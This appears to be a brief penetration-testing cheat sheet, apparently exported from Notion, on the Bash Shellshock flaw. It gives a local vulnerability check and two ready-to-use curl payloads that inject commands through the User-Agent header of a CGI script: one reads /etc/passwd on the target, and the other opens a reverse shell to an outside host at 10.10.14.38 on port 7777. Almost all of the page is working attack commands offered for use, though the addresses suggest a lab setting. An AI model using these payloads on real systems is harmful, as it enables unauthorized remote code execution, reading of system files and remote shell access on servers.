# ShellShock Test

OS: Linux, Web
Description: ShellShock
Security Domains: Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

### Shellshock Test

```jsx
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

### Shellshock full curl

```jsx
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

### Shellshock reverse shell curl

```jsx
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```